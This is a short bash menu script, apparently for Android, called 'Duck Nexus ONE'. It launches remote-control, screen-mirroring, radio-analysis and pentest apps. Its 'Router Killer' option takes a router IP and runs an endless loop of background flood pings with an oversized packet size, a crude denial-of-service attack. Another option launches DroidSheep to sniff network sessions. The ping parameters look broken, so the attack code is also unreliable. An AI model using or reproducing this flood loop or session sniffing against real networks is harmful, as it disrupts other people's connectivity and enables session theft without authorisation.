#!/bin/bash
echo "Duck Nexus ONE" | lolcat
echo "Make sure you have the following apps installed: UniMote, Mi Remote (required only in IR supported phones), Screen Mirroring - TV Miracast, PandwaRF, DroidSheep, and PentestKit Mobile."
read -p "Home
[1] TV Remote Control (WiFi Required)
[2] Universal Device Remote Control (IR Required)
[3] Mirror phone on TV (WiFi Required)
[4] Frequency Analyzer (PandwaRF Required)
[5] Router Killer (WiFi Required)
[6] Pentester's Kit
[7] Sniff Network (Root required)
" choice
if [[ "$choice" = "1" ]]; then
am start -n sensustech.universal.tv.remote.control/sensustech.universal.tv.remote.control.activities.SplashActivity
elif [[ "$choice" = "2" ]]; then
am start -n com.duokan.phone.remotecontroller/com.xiaomi.mitv.phone.remotecontroller.HoriWidgetMainActivityV2
elif [[ "$choice" = "3" ]]; then
am start -n com.studiosoolter.screenmirroring.miracast.apps/com.studiosoolter.screenmirroring.miracast.apps.activities.SplashActivity
elif [[ "$choice" = "4" ]]; then
am start -n com.comthings.pandwarf/com.comthings.gollum.app.gollumtest.rfsub1gApp.activities.GollumSplashActivity
elif [[ "$choice" = "5" ]]; then
read -p "Router IP: " ip
while true
do
ping -t 255 -s 1569325055 -w 0.0001 -f $ip &
done
elif [[ "$choice" = "6" ]]; then
am start -n com.pentestkit/com.pentestkit.MainActivity
elif [[ "$choice" = "7" ]]; then
am start -n de.trier.infsec.koch.droidsheep/de.trier.infsec.koch.droidsheep.activities.ListenActivity
else
echo "Unknown option."
fi
